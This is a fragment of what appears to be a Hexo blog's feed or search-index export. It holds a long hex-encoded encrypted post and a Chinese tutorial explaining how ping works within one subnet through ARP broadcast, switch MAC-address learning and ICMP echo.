090de73b1067e936bfa7c5bb87082e417704f5c296098c928bd7c94b474f246b23329dadabea9b47b57a832366c6c39519a38ccf02f5c0c7f01a7b99de20bea4d4c2aee4f2e071a77b84a82b636582ff0d5192bda58cd0033240b6ab6538cdd6cd3cab0081c64087ea70b38298ce594c47835f5d81c76a4e2bf3a3821364fd4eb5c0459f475785df43728187f388ba2977f6e63257403af7be7bdaba8aa7c73a114b826b64018cf310a1632dd4af9b321874043a50056225dc508504df6f745a30537fdcb4ba55ffef5aba874f7d4a2c89dc45885e745db16861fc4644bed53ddb607aec2547326a2b0684bf153e3c9f265fbe07daf7273d73cb72e761a634007c7a93daf96a1dfc977e3042325803418be433f5be5c920513cff49f8a50838cd602742c35c8c311897ee484d0d38f774d2ff0a7696826948f933981f761a9aea33d274c2d7b04c660607e4e6182161bf4f86fb95963e5c274875d0472f16817a63bb25af1bc97b0e701a74cf34f639faff59a77e0f5c37eacd6c356ce993872c055005224c407f5ed98d6dc0f0e0e5d048582858b1d854657df567b8e6e8a0705dc675843e48f44d2fce15133bbeeea55b8446162479d20d6adab4f5d87b29266141987fb9dbb41143a7cdb3ed113b1bcbf297e32a621dbf65b07bd79b7d027dca5fb4870041299ded4d20f4c03ad6c7711f7d029ed1b04228acc5b3fd4a41b3f25071772c7d13d7a9dc1ea5d074e97dbc81b41bf784c76bd7e142ff8c0d2df1925b68d3cf3fab13247468be38e255215f538b3c6303118c9f8496c742dffcc1909b6eb4e004c9b536fa28e238d1e65e7b7b4fbd4002099d246c9a01beb2bdc526c4f6bd9549b714fddeddf66896309100704b9be35a426089d13c1080ba1236fe995d7e46f4977ca8671f0843e304519f7d13489f4fae16f97632fee11865114b2a0c3136b52e91496dbd96bb147bc0066b1996a269009100bf55d28d3b09048a3e0b16b10c828aae491e20be3a5b03fea79a1c74a063f4aa8e703f28e0e39d72255a74d9c4c91db16a736528940744a74323cd46f1ce03f70d3b25d023985058208a4cb500b109cd11f78fafac857d41ff27410864a304bebf1e93bd0e67b116bf86540278de33e191f906458b01e8b0357de394ab31e95b6462d199f0dd9a80e8427a50f86a0e454580efa3f8b89f6fd83b9159a4ccf78368b3191dbdf5271407830e1193e07df8727ff97e43d694b61bc08c88d78429339c42d0f5d787402a5980abd3d59dbbff5d90c2b2376cacd87731cea756e5718cbf894aad32f2918776a12b8fb1ece44bb6b96fa89e445991d1fe2bfb8ec393654c3886c74968ade3783945cb4877fce1a493ee9a50172f31dac32e8f928eed5b9db8a0ebde89d89061aa7ce4f78155a7415e8e3b5b16af1ce426b4ddb0bb9c90b0bd9e028fe630e0d8608a0ddee08ad4ef0a1cf81adbfa1313b676426dfb3339a8b2604f2ead4c27150bc7f2ef616d5c76f6571250baa3b0e371c38796c84850f0eaaaf9e82855d239c478db30796a74b0e68ff3a1f82d1485a883814e368dede5c6e85d9b20b7dcebe75b8fa46cd236f9a2c0bd839837f0713a5679862e17d3b405db8feffd8efa6798fb091a11b2f13a7fb7d7e5dfaeae0d8e966825293e42f7d87cc09d12a45fda4ab81c4f0112c8715dd2047f5d57fdc53b3d53d505d079b42c51c3ce3296b5a0de784a743cb71385a424c3a10535c1c5bdc588b55e794aaff61df08074929c49bcc90cb48dff550f077254c7be42eaf65a46c0f97257fc313739f04f6347537eaa2858630af03267b86cc57a9d62f72d10c5ae534fa477236d2c8b32c3ffefa06e7c6bb341be0b4b4290b9754a81c7155f2229fca4036991c1a83ed240c6d8ed244bf815687ebe4ead703dbee7aaa5e7409c1496f0e74df71eb34591190a7403176935230240fd9e7b01127936a2d167fab9d70851b45fa8eaed7798663acfc9828ca874003616193f95e6fcc5547b327ba2a074af3204f5fa0dad00ab211e2424166e090a46cba2a8fe5c56ea7311dcaa2e7b54c945c6d7689ccf4cad5ab2f5b9b4735ad0f5560593ffa2a9df65c1548c892ceb41e9e241e61f10e234edb78d3bd545f0e57ed577c2e3524067a74703d6a08a550b14b2924413eac7d3f85c475f4592462989bc5e52fb36977e195e943f11831ec6fb160a329f5485c4b422b198e6d1aba2752d512f4a01eb68eaf07ee69b7bb05f7842ccd6aef46406c97ee9fd9e118e268ca2f4cd92c03ef5d30769c51a87e4d0442e2d05d32f3507f975a6c58d157a38fb62e287605a5b47f43ec5a30c78abb4c79cd59daf91c9cead2ad41692074b9778a9933e3b739eb92173b7f0332c657fa31d1a2a00e4c2108daea5bffc48d28830892d912699587c5f8eb889ff281ed5a2d76cb86ad606c43c25e6cfef93d01bdd46526f1de1f95588fec3da32669272b27d975f08f9ebc7dd60f7221813d95ca0c60c2b5a1e456b7fdb2c25767df0a3f62ac9a4e4bc182e1948e70020ce60622b6ff86a69afc8088369ae9b0eef3918109d6a5fe3df289c265bbe2a7f085998718edd29232dadefb5c7b916864d51b7b9940a743084d4371eb8632b4f48eea7d8d2e557fcc5d843e6f95ce991041e505d761e5fa33449643f5591400a980ec884895f849595a143a2e8c52b37713a1091cebb1e26c7cab23d963c3da8e132d7973cb1216a39baf054bc40ff3b8bcef97076bc2f726025c8467dacccac80e96d639de122b81bc5ad58569395bf7cf965cdcd4b4a12da070b42338609e2d6c70d620ffdeacf2162cd1721139b2d5bf7b54c8fc82c27d8342f77b22f79e0cb97ce5cf7ffe93092d442797f21d8724a2fb21a14291aa201aea18b49a592836ebf07b1364b7856201afe2bcae8b2ddd8f4b057ee8b906de3f3f630c77468fd0f5a1993966fda13396d295d9d60cb8e1574a91a49681c1204aa11210d8fc35764512f77ea803b76483819c56db13ac0fb460dbe6b417ab2508461fdebf7830db3907e628351865b453d9c560c66e1d38cd2813cc1e4dc20b641aa42c266392653e486fc6d7002f1cd28e94ea68bb63df3ea24379ffceee3a61fcbf78ba08126426dbdab7f786fd227bc41deb481525fe8d4f856c32ef14b836e8afa50edfdefbe6a05bf8cda407929b5f26e791d6a6269f3be8fc95a61f84fe5de5d78fccbf2a003a509a7c2a48bc01fdf10c0608f03814095f5ac874267f75c1ae39b22e91e5f0489592c2591d572c41938a2254bea25710e9c23089393b01369548c5745be36685b503fca83968297cc0f44de73c38fea5e20f85dd4b1026d91d4e9e82c23fb3c831b2c1f91d83da31f9cf27fc48acb780c144a9060ab10a7b2d2763c572af2c7a46af2202c22301633d66773df90f10cd9a68588247d7309522f9dc6f922025867fcc8da8ac7fd93c82e39137481c1aa7c1a70b26afcc0e2a773f93c71785e335b67e90c7bdd418346a1c0e448f67ba0d6a809b96fbd98c7117b6e8f41fbf78095b559da3e7c0253c8545b400aa1400457d60fdc0ee1eaa5dae18e190b78d90653441eca7b8040f859d16a0b099ff12e633ff0f7be33418940d8d6cc4054bc8bff7ed2248f5d9a19b1892df95f70e22384bf699665fb50d26d3e5412242c22f33fe63d3a3891e10f21fd5fde4affb8fc0498da1570e4b24f65a0a50c51e9f639fd76d6be57adc54c3d57e6b2c9814ae732308e6c87ca90f1d1bab76c65837b686a5e6d415bec01dfdefa1077b53bed08e55b01169f79989d6551463fa0464e3506d36c19b7754c0972bc764465b3db3799e54e5ef17e801d50aaf379f6b3b9409aa1a6c397f3c84fdc21c5c1e6d96befa3e387e0f327dfedab857cc3c500cc448bf2b31797fce4b8b080ec9f472fe594210585ab24fa7ce040fc17e0a3e4c1d2b7f3c8f047c8ccc6f09aadbcfa16cf8c38035ca8710b7e136712b15e29552c8040081e0474fc5bbe3d959e49d8fc64ce9fd3ffe6ad10b03d2098b22001308fa73ee5803df5951bebaa7dc036cb24d7c383866158ac6ce16efeff6d3a8e311b8621ceffab6eda4cf8d3a99371b8c3592fe67f5f8b8a127cf45249488805a1755a9e1cd82ccaefa7952dd0d57ca3b923b516b612b90e6fe719697821ead51093e43766e422243644682d471138a7d7068e69d372cefc0b03082989df7664c427996344f6b8583430aa177acde8b2d71e8e90fe138fcbeb84f55bc3f9aa5cd7c7b611fe938c4efb74690495e6d6bd40b06a928ceec68cc4939a9df81e1819dedb961fb1094f290b26c4f4dc94822b88de067df29a604078115a51ed0176e2bb938048737b82f13fe94a38e584e1fcb4415df8d9ed588ed8ee4293f14efe8068ecc3d3477d7703ac4e5d76ae83f7a6cf530030f08cc4fd7721f4339c99a4fb498cfc5f92d3d02ab9c92eb0713fc2f2b2c5afdb59739dcd02e53bd0afce74e28d30b4362054f0085ad215b366b00428062d229fa2a6a739cf1216b1c8431fac9fa8f51b93d325f44927c3aac51a6e3329ae0e420b62d95c8ed2e97264ae95a14735d361d93b69ba65315862841a590ef7b3c322361642109ecaf3854c607701239b3c7556d29597291d9675c08997e1dc5248cf16f48263b38b6e715d8f55a8ce808fb597cbc077c8b7edefbe3c5b13767c118766d918a4dacb5da596cb2ec231167c0ffd3bb8c80d4fe941edbc59d7b08bf2da235cec0386dde5e27ad8e86cbe49ca468cd6ccb465ab33b7aee953bab35cf5a4f959c8e3da9afe5d22e9980158da8654e9603d579e7f3ab0362e5f6afe31c61e377adebdfb5a2ddaf915642cd954f7fb43513272c7ccdd81b9fc1fadc989ad8abf38d17f72ade6a02977e771ebfb52ba98eac6e2b4a0cb25ecdc729480e1228de5ea37ec11c89e1323c4ef7dea8d1fff4949c5957f296d3dd49fefb177b9d3b3387a0290a94ee01cf3532235ee8df699037194b9f2f35fd7383f5bd1496e8fc70c02fd84986d5356b43dc67fefe13e1bbddd6bf6ebd5b03917406841be5550eb727d1f93a283ef9e173c3b6ec143a2ee7f3574b8d98db13cd963e6f9cd4bf830e5cd6400f185aa21e139e6bbf7b14bc712c11978a47770aad462edfb60d6a86fc03240630de6b8801cd638ec99bec168b0ff50ed0f73cafb7d76a3805983003bd59bda40bb5294d726d68a4c0abaecc843e7713bd6960dea52435dac47e0c8283f09e2a31d3bd45661abc7474120d739c38a2d46ef5b10934856c9b7c20ceb22dbd94f1bc5d54ee219abbd62a66d82339565266648456c3249e3eaf715e07ae5e992f21bd643eb9b3b0b5dc81e94630d5922804c22d0abde81954962636fe2cb0829bb7ed424a574897572d4b16faadff9a6f3f9c766c15e7c0d3251fdcbb8e9613a0140f53eb22d0032e21296270a1fe23b2d9301b3a9cbded77815ba9d389c0beb6a68f62548f32d59a58e87717d3ec606a8549158f3ed50725964f1235980c04c1562ca09b3d708ddd0ab6921a2f6e792ecc30527447c0468c50e42a5af508e3ea81bb8666519cff5095c97868620900a254b66c942578b482eb01ede2f0aff3aad38e41c072032742a3725b4c3f84ddeb1b5c2ba3fb1594f326fe3c6a7022454c84012fe4127a81639a298424a9be7e74d98f7768e920fb24d0eb7e4a8f9f165bec4fb1f666dafdb5c68fe07219d466950901b8f946802cf85e0dede08e963213762fb94a4a56b67012430ee89e9c538cfb4a28fcfe2fa604efa287750b7b038a3c23156982b8719cf34b654b39bb7c4dc597faf3e1f1d962d75e91c838a5c2e5d8fe6f1c8bf12635017f1db59fe0767b9ea246932b03863636353695f1904da3a4adbac5f3f038a0dfaab437a62ec1ad229a32c907641227e25c67eb5241741c53ce7fdad32929777bc58929aa93ae2585c8eca8dfa1eaa04d18174d42ffd65cb42e15b6232770ba949880895e949a90b24f6b3166bf3dc589e7e373c52889fb3eb5046e9b5c965597ea76c854b692e63bf36978473afff132e136ccb654e0c4dfb1fb47c142246bf101295f6e857361de807bb1313fc7ef32530cbb630bf7c014bfedd95da45ecd75a9e256a8fe76d8866809f8744905ce46ca5eec06e3655791bcb92aab8719433b06d94812c5782ec5201e54c8eb7b4367b5c32ecf7956ae17d45c5a234da69a8007cfed21575a4d668ecf8d767ee5924ff361c1a5edfd0c38c296a63a34d9320752c6766fd1d1dbbe7fe4ae5395ac126d1bb238e6439adc128573a28478005c1358347d1bc7128a0852a0842f019efd5c79771de1dfcbe18ff488e0fde1685b8d057cb631ee35ab903da3b9403ffa21fd3383ae4a0ff6cda0f7650fdc834ccd3b0e130019063490c8cce1e607b0f934385f4bf40afde17c2d915aa5c9ad2d89a238827b635909c914047bc241113d5d4f53437c2e0247d221a55e4938cfd37684cd48e7f9b50966149c611a2bb2ad3f865a3922fb4bfdb3ce61f66dbf9e0c3ec854dbea9c201d7f64a45462202d89607e52ebf75be1f10b2ec0c1290c5e67b9eabc478b336ff664536a866908d6bffb2d59458507f841080c63e0fb330d4bbeac6878ff7f09d1141deb074620ab7715ea863101a0b12353ccd8aa7fd832065b821e26369dd88c227a26a475a960a4fcc90f6abf931647c62118bab69f18b20b3a242c66dc8735d08139898b2261174afa13030233692e4e6aa680f1ba4344020466221f48ed3793fbec33b6bc78680e9d42efb631b9423f4db9552d5b2a9e4e231652e05237d0acee44e7d0b04bed974bac3ff654d54efc1018d31347321bc018cf0bedd77b96b8f9392f5a71013b87d74e32e913b847edb54cfe9316f288d3eefc4fc05a0bc79f1037cc0d0aa000625972e6d55281ed0f6bd7aa41b89aecaa5450edf3c0444b85faca161592997708c4c4bffe863a8e1ea236f2e73b040319b516c5e8dc0eaf90baf94d0364b6439220b64952a487f78c7538044bfc0d7240b71423a48c2f5a23096dc4f0d17e623a961bd3a2e196af8f4e6083ff7f0139a787f7e1c546047bf6a4b304bc75b7b648098c054b49ce421aec2d8625aadcb7155ad9421bb262f521d2401055cb293d59e6cfb9f29c783193587d2811c3b1dd6d7487df6059b46cd0e34ecc863ab631397a18acda301536dfba08bc59d1c64b95bb613b96b230f95b925ab72bab59f181f2d3cfc2d1d20d10dafd5c9e340125bc33d0cfd3c404b92738310674bb4508224e7439c74dcc37d2758943ccb301356e5f8011d7655fb5e80bc0f9af8e26fc7a82afe4d55ce7ece9a75d7e94b0be70bf988d5a3bf8e18400164376b65022fb5b2758b1eecdf5f39955daa3a26cf5d04fae2aae93401315bd4dfeb72ff29969200896e3df80f8e5adac474d8bd60cbe22ccde61a317daf8dfce38ce506dd604063456f27c4f1d6bde977a3811af494bf7add01b0162d0cefdc67209b216ff615d122c58dbf8d260172aa03034465d1a637638c1e895be86d7c835bc8ff640542a6276b13cc99c6828419580569e8e3e2906cd3f68215738ec7a2c693ffb6b2494f7b5684b88c3e7883935f1f98833ceb2eaf96df96ce2152589ac164ba2d432062f8d55d0c82832f08c9e9b5ddf716927584a95f2ed37a497e2a54bd2c705dd6dc359d0a53751c8e2bdf6d74a65025bdea4556606c6dd18e8d752dd7abddc3a7d177a9b6c34ddbb644992c8f812dbd0699401e751ec1e96d9750c53e6360877a912f2b584fb80bd05aea17bc46ee1bfb6ae27c15565eefac6f02487f384f2d094417907095e7688b1a49f15c838015c8be482c21c553c7afbee7f8ea937ca58330c39117f8e438d32e37b9368534f9a9572b619f7321978ca68992441a156b4fb896089db0572715951f8770ec2ccfdf964eef1ef2f22f02622ccfbe6fce89246ae72a0e6b4439941fed51bd675d7b72090a1b541eda973930aa5cb0bcf89939a0a04e3e284d34342002c0c0502f2c611c52acef154d570ed4a348a89fcecc54f52cc8ee747bb07ddac2dc2187fb5e1d85f1352ed36cff9631b55a4230748bb61b62388e24caca04f3e0d8511526c9ea5532e2d8a09ba0330e0ee6ddd17650851f705bb44d444a412af4281e0793d51065eac09c130e17f69b0cebc9858bfeb947fd138dfde2660c7ae495040a6f717d0c4aac6dc2a8915ef5f454471766bd099d43545abb6bf044ac2baaf40e85700a0f2416c7c0ece8187a5c1e14688600afce8145313249c698a605530297c9d3691a53eb8e4dcbc4347bccc638046797a832d40fc65d7b4d988b6d842c19807ebe2350e120fb131c4ae9cb77040b799d9f1e88d0a8c149515b1862cb920771affac7d4b9d42457e730ed0eac0c4f5320401080a8095650c46ee3654d76f78821ce89913a946aa00bea20195e184007eed9d2abb680d5a9fa30b4719c986e18c720da953bcb442418c43d1e91b5fb8f677d05ee4cecda76259ae65cfdd76e104c59f78b15f5f7cb98be660402e7a3ca0020b4fcd88fc8f502995c8d5636e59ba04c2f83f07d0577070209dbb0dfd93de605e09b4daade1173d68d04ac2a73132fee5dccb19e9617ff242af0cf2610b6bf375f0b13d0bdfef94e6a02ceeb4aadd7f7ba379a0c02f16335bc5a0d368222c606f8b0fa33b463f503fce0ff4ddab37b088845b5ef1beee737479dd4fbbe400628caf877d8154d08102c9e8fb2db9280a0a325c2c06dea59b110ef20bf9825e14c09549dab9ee733d007edbc97e2beb171361ab00ff7e76b5b3f2332476bc2ebdeefb8dac517c1de6b6bd10d58966cdd9a5f751be2399bddf05cda4603412bd9f5789a15c4400506b0d7cec8bebd0ae10032e8a1e70478b16c5b20b0c73f7cf700f508163d2d817fbd5e1ec9bf9a03278133bace3fc7dfef79c4a80b43b20f9e79a7074348188f52dc5b7a489009d92fcf3e4279ed3060b418cfe6a8eecb2df00e4bf47975d6fabe9ff1419fd3ad0edb7912d8a6873bdc633cc212f887132f4b93bb42041f6f7983dea997f5e298e743da3fee78a4e0b6056302cc325b7a2fd64de5136908193b8b6bb63e75c244a495ff4f87760a3920fc9f675639923a540f76d567f2f1a8cb29d4037a92a75011ec23e596a74ab322682f99628b580f204006dd89921d3e804544a69cad8bf410504162268c7c664355eb2d1006ce8821b165b384e3946c7a2b2448a6424f9ee2e9cca9bd0eb745c8b85dbc9a0109e6fa069ae30af8909a31f43fb81855d1d4f1538b5fa8de7f91084f40df234faeab0e4caf257e4628da82f727b6f77b108e5e94f739664f741399dc98757abc9b90fd549ef64298d3364c6fdddbc67b96d34e643cbaf54563b02101c93e72d0fd9f19000549896a8623e6440bd6ba94f6e5e6eff8d0f45d3d91c53d8528fa26a9d47b09c77f5fd85d4cbe6d652d0f3ea04df26e98277b63c8ba2b34322c96dca20b1f03167b6703cab47b33b372e66e977838d7c2d1a9eeb0ca4d9697b01ba6234d04791d201d6702cad0d1c4433084a9b73df803a77519f8c05b6b48082be9858a9f958492ac34f0d4fccc8481d1dd70a25f4579a3fca039df1667b05faa4ff438a9331d18f5d0163db1a0d88646fdac64105b19f41d53bf67a69bef39188aca5c050c34f5e936c4df352086c4df498aca3e1f32660168f602beabe4431bd52310e6da3c7c3b9309c7cf5006cc31adfb0ab7b706277bfea9065bc2953943d6941319495487fd3d44f724f9c849f3676ff60f4ab97d69f4778836df0fb805e29db46c38e01cfef7fc46cbf25b0c7ef84a8a6ffb47ad73be019f4837827c3d3b2f4d8a5c4c70656800e464f4a366f0fefcc2536d8920e3cea5861c5decf4377e5af4f729a803f96e0f5fc045262e3ae4fc3368d8635634b5b43b07183575e57999dd2ca96ece34447d1056b93e75fffd594b9b26aedcb32ad507b6f5a113589649b7135ef10be2ae6e70759169ee0e213643c7707f9bd15484efea7f9d9cd11647e2ac8641396cd54dcca6ec06253d8f042af911b5ee69f0610fb9f26d9d068a69e31248d6e4b2c35cfb453995b821ac1f2e477379aabcc2416af37b739e6bc71dd8fd7d6f1ab1d7d2dc8df407a19c5e5033bc6b84ee101c747e9b92dec9b131085ab5aab8e6120384a6038e2dd3b48098a56a7a15e72b5755525bdabe5522f2b4cbcf93ec7d5263a53d7eca8caed424c6d64a1eba8f8a5cd84c182f6063db1a09b8c822d8df08d6cfef92a5658dec499c27f95ad41e762facc30ac2a2473a366677f9a0945fd6313280df0f7699441305787a20d60a08c2d7ba983b8e604730b561549307aa33c8a773e881ddbd133db4d11ebd8621a5522e221f516b3964a4ffee59a988e9c31601ebe3012405c73ebb8b5e3ea317d3de52e33fc53634e0b652f955f1a206f66aa00a592cd0fd268aff453bd3804d4c35cd6836d86883083215c7d4687cb0a786992df192fad0613b19a6adaad6dfc6ecb5df755607d875e8452af4124d20b2fab0783cd1610b9fd0899abf18c51e96eed62a3bfbd42d832386ba33e21b8e266175a5730c636c8f107c48fea256d09045f352c6e2c47c9eb0bd21ac7c5a88839a4c1a97026779541551a252ee30ce75e00a54c914761bfb37334ea5b1c2112d40b5df01681522b3f5450d43bf75897538c6f44929aec54787ea8830fca5c37366b2635e6838dc078645c77ae1628678ccfc4fbddb3a5347ab7e3f98711efa7bd53e5d6886aa649cff4700cbf01bc42820a759882e5313df56abea563c12c389e25b73a80497ea467308d9b615840241fee337f1c051346eb32f255ecaac3006f3933b56916b001b829bc82ed4e6a7351064209bd6be8d514cb3a7d3d0d4f300e263f511000d337dcbce8a3689e6f8be798e6ac2132a20de53686aba3f66a36c3bdaba72df193e1f6f9c493e8800896c4e376f7855c0e7d44299d766b9b863a358b83ceb7aafb1ce093b62d4318d7c981305971aab448271d28911da6e3517e799d0554052618a5c591c968beb4ccbf32ee5d27819daac0db2a586ae89f8a6fd65e9418466d60dd2655813b4429ab593275227455c043486e53550206659672cd1da0ff23e76b919e402dd548c959dc527ab10fec9a2df19e2c6ca83bed0f5a84296dcce7f59683f7dfe6f2f503348f5e5ff7e6e3a2b541a80092561a46352aea4fec03dc7d47af639369cbc6913e7b7f08944088e400bd9736d57bd13bbee271f5d6eb85b39fcb8a0e5734a73d21099bfb77a17650ae8b6d6e3680cffb7de78467a50cf1823432b89110001ed461ed7ac985332eca483a9ae431bc4efcd6cca9e9a6432d3dbe5eb2db84d3eec1fec5912a7a974f564985df64c5f34fdf0f309a0721d7c80eb7daba1f9849c1be320f3c64f721381ecc5c32fb170369bc99186085cf8bccc1ad2782b9931bb4e1f8a75f9e3a831a05cd2e69f5c7cce9b533ff194ee9d5ddac047dd2219e0bd380e9bd5f262295aae109ab3cafcdaecbc82ab7d2ec3ebf19d57c6683e101f74a9b9a6fe55ad83a416d2beea58cae98db0ff451307642b26e025f30bc7e18886ce9db2b610605e207969c6d380b87bf950879d9b5ac94e019ce2f07b8f9e71c1f5db047c2257aed0d628c8938d53bb0287969da4e3d87c45f16b2380e67bd390f01ca154bacf92232fb60a34e10cc8adb824a4ce4744a7dba8dcf13868f8ff566a87478d99b4c028de16c710645ed47f7cd450113d51f81ad95a80c1e670b305722dc18bfedd86f1a11f9012b6eebbee9eb55ffd1be876ca8de25bd9da505714f8c01f2df1cd88c70d6196e9803de60a2de9e54de232bb6defcaed29c5640426beb6527224e39749e05c2f9db7cb2f3bb380d813d624865aee715a9640e54a18faa7b9088a526cea67edc2a9b60fa157cf2bb29968ec33b3fb288f5eb624366c79f49e51adfcfbc0adefae946786f6ba2f60d2cc224b08321df73b34fa25def767c76a212040a64a79230867b9488875aa48cfe07c4ed85532be22719731d7e85f2836640ff4a58ab8ccc7638589f6d1373ac0c21d2f6f5ea73ef5066c0602a5520d68bf4e17ad30bda0abcf0104ef204717231f260e5d863f376ba73fda659474337d2e6108e9eec049e406bb24b2ee53b9681e73c1ceb1770f608d95304b89bbbdd6fff99a4802de93d6f860a1aae6e0bd3e1e134885aeb74b9daf910af5d59601a2a937d9562b37fb0843164f69514b7a80ad48078d0ba63becf89635dc153d794835d24ca0cefa74ec7edbc76a9a590573cfc52412f4c596223ba3c839ee200ee69ed2a3f3121bc8263afc27fa4ab28ae52962bbc3bc56590ff7f49a54ea9ac362805faa2fa93e68f2fd152e3c0f606e6c609b7530fa467a26d0397c3c670a54e46560648b4d4291822f1c3c91b69f2739e59d80de4ac6a5cda35fc8f04413ac3172dfcad8a95763e75a385fd393c2a0296f7d566d5d781b366026d5abe0da6a1f1606b4755afcf877c1028db51264863c6216163100250a9d64dd52157d389356bbcfdbbd3354b7bea99ab221b5bede2d56df20c65623deccf8c84e9bfbb564e07212a2625fcb8d2d6d26ed84bda8efef4946d30cd04e9103b4cbc48959e6e66d1c026cad218d93c9c218512962c5612b62ce3d30cbb387f8856f84e82aeb3f4eb2d5eb9f3325c01f9f8b9939d34152fa3a78ba06b3de9e68af5431d5c1985136f8887111d6ee4915e1b277f21f98c82ddff30b78b3cad587f0dc28f21503990d79e118a766d5844ea06da83da7aeac2499205cf6b4a1167e823f370caa2be3e944060f1dcd49a16de72808876245a341fb9e8f458246bf5172fec03a9abb0e22fde82a28e0bf209170f65d2ba7c7122f33e3b501e94d75320e16fb830dcc6ad123f68b8c3e43a4db5f1a1899a3ef3a79cd2bf85a5d581045921640e61524796970eff057d5412706163ed62f1715a484167165f3bd004d41536bf7691c88e8db844488b7e048a2230244d4a225b6ad183d743f1c9642394d8cd1abcb91caa0cf282a647a52d21d98cc5859b2effd659c5cdbdf6e3f30aafdb8c2fe0059c08d272f679359e1a65b68f843086b8e036cfdbd7229aca020f4558de19dee83ffb65d4d325758dd75c663304996d585a2e0594e6555e68c6ecc9622f30054c9173627a5f8fd5337efefb0bcb8d540080c80ab26609ab7907b61ae4a88c2e7c745130b9ab634b4e3a4cf7bc9b539eeb277764d8dce2d86d20fc84aec972d29c8106e34369a75fce806d92ff874cd8e7271b6650124ce34a287fe6d47f77a84d7166817fd9a2450b28b42b258886a32760419bb7337851354f8803dea2553671a3956c98b2c503def2d79b7c3a55a8a0ea947290d5f68c69f11f03cb77c1ccba42a510a0cd11c2de38db903ee9df63b4093ba6fae10c2d7e926659cbf3d3f3dae06ba84551a7cbe89aa9768b86a6ef0625976c4fa52fbb3558e2e64ea3ec24dde7245e24f8b1d938f58281fd2b29cf4db9c3646ef37674f87a9c7249b9720302fbb5866f583d2b5a7c543b09274a84576de87f96d4763a63cbff2747c4f252a345e564bfe7061d52ae4d4fe7fef3341b8f174b09effb902bdcbdf8a3ebbb854fca0a9f3b7d283a772b858b81456fb59d1ac36e4b7ff57dd1e2d8a8a3b0db5549daef80a664ba2811d9491477bf4cccdd0e376286be07278f5c033736a372add68ee99ae57e2c7c2129f47acb16054ab457fdacedf531a2086505e6a588cf585de06c4f7c94642dead63fc629c4c05701630761a74df8afe7866fbc8722e6a91b378ca47b9f7eb9f318db96ef445110d8716f98fd2fbbbae0f40f091cab6b5fe7438fa516e903868f2520281e0f6a3699fc29b5c6af674fd618ad78fc21c1e780f4003f5a21447da2177ab7fd91ffab552bebd845f51d0147d4a5c4b641224e52f3fcd2270a351334de484d25f879c0e31464f96e4989d36f102f56cffce641695f478eca768d4c0650e8f9779e01be5a2f129a4ce2685d54f249bfa00e062318e524328bd532d54058c5381793665559bcf22c58b007d4a25a2d39090875370a59e66e89fe07198ea60afc37101549623eefd5110a9978e344b2617ffacc936589e34a854641781ffdd5cbe8c0a152a46154f927ca12333019c21f20fc3fcd83de0f244378bd7eb274f572039b80181524e75a488acc0ea99ec5e742e4547e547246c4c9a63436</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>横贯八方</category>
      </categories>
      <tags>
        <tag>横贯八方</tag>
      </tags>
  </entry>
  <entry>
    <title>同个网段和不同网段的ping</title>
    <url>/2020/11/02/%E5%90%8C%E4%B8%AA%E7%BD%91%E6%AE%B5%E5%92%8C%E4%B8%8D%E5%90%8C%E7%BD%91%E6%AE%B5%E7%9A%84ping/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="同一网段和不同网段的ping"><a href="#同一网段和不同网段的ping" class="headerlink" title="同一网段和不同网段的ping"></a>同一网段和不同网段的ping</h1><p>这里讲ping的两情况：一种是同一网段内，一种是跨网段的ping。</p>
<h2 id="同一网段内"><a href="#同一网段内" class="headerlink" title="同一网段内"></a>同一网段内</h2><p>如图：</p>
<p><img src="/2020/11/02/%E5%90%8C%E4%B8%AA%E7%BD%91%E6%AE%B5%E5%92%8C%E4%B8%8D%E5%90%8C%E7%BD%91%E6%AE%B5%E7%9A%84ping/image-20201102225812176.png" alt="image-20201102225812176"></p>
<p>首先，如果主机A，要去ping主机B，那么主机A，就要封装二层报文，它会先查自己的ARP缓存表（IP-MAC的映射），如果没有B的MAC地址，A就会向外发送一个ARP广播包。</p>
<p>其中ARP报文格式如下:</p>
<p><img src="/2020/11/02/%E5%90%8C%E4%B8%AA%E7%BD%91%E6%AE%B5%E5%92%8C%E4%B8%8D%E5%90%8C%E7%BD%91%E6%AE%B5%E7%9A%84ping/image-20201102230033695.png" alt="image-20201102230033695"></p>
<p>其中OP：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1：代表ARP请求</span><br><span class="line"></span><br><span class="line">2：ARP应答</span><br><span class="line"></span><br><span class="line">3：表示RARP请求 </span><br><span class="line"></span><br><span class="line">4：表示RARP应答</span><br></pre></td></tr></table></figure>
<p>首先，交换机收到这个报文后，它会学习到A的MAC和入端口号并保存在MAC地址表中（MAC-port映射）（或者更新A的MAC-port生存期），接着，它会向所有端口发送这个ARP广播包，其它主机收到后，发现不是在找自己，就纷纷丢弃了该报文，不去理会（路由器可以隔绝广播域，一般情况下会丢弃广播包，除非开了代理ARP功能）。主机B收到报文后，就立即响应，我的MAC地址是多少，并回复一个ARP响应报文格式给主机A。如图：</p>
<p><img src="/2020/11/02/%E5%90%8C%E4%B8%AA%E7%BD%91%E6%AE%B5%E5%92%8C%E4%B8%8D%E5%90%8C%E7%BD%91%E6%AE%B5%E7%9A%84ping/image-20201102230314390.png" alt="image-20201102230314390"></p>
<p>RARP的报文格式如下：</p>
<p><img src="/2020/11/02/%E5%90%8C%E4%B8%AA%E7%BD%91%E6%AE%B5%E5%92%8C%E4%B8%8D%E5%90%8C%E7%BD%91%E6%AE%B5%E7%9A%84ping/image-20201102230356473.png" alt="image-20201102230356473"></p>
<p>交换机收到ARP响应包之后，先学习B的MAC-port并记录在MAC地址表中（或者更新B的MAC-port的生存期），接着它根据目的MAC查找MAC地址表，发现这个目的MAC跟port有映射，所以直接把这个ARP响应包从该端口发出去给A了。</p>
<p>而主机A根据ARP响应包，学到了主机B的MAC地址，就把这个MAC地址封装到ICMP协议的二层报文中向主机B发送，报文格式如下： </p>
<p><img src="/2020/11/02/%E5%90%8C%E4%B8%AA%E7%BD%91%E6%AE%B5%E5%92%8C%E4%B8%8D%E5%90%8C%E7%BD%91%E6%AE%B5%E7%9A%84ping/image-20201102230509174.png" alt="image-20201102230509174"></p>
<p>交换机这个时候已经知道目的MAC为B的数据包要从哪个端口发出去了，所以它会把ICMP包直接从该端口单播出去。</p>
<p>当主机B收到了这个报文后，发现是主机A 的ICPM回显请求，就按同样的格式，返回一个值给主机A，这样就完成了同一网段内的ping过程。</p>
